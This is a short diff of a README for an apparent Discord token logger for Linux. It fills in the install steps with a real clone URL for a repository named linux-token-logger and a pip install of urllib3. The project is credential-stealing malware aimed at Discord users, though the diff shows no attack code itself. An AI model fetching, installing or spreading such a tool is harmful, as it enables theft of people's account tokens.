@@ -8,8 +8,8 @@ I made this because I had never seen a discord token logger be made for linux.
 Install dependencies and download.
 
 ```bash
-  git clone url_here
-  cd proyect_name
+  git clone https://github.com/3V1/linux-token-logger.git
+  cd linux-token-logger
   python3 -m pip install urllib3
 ```
     
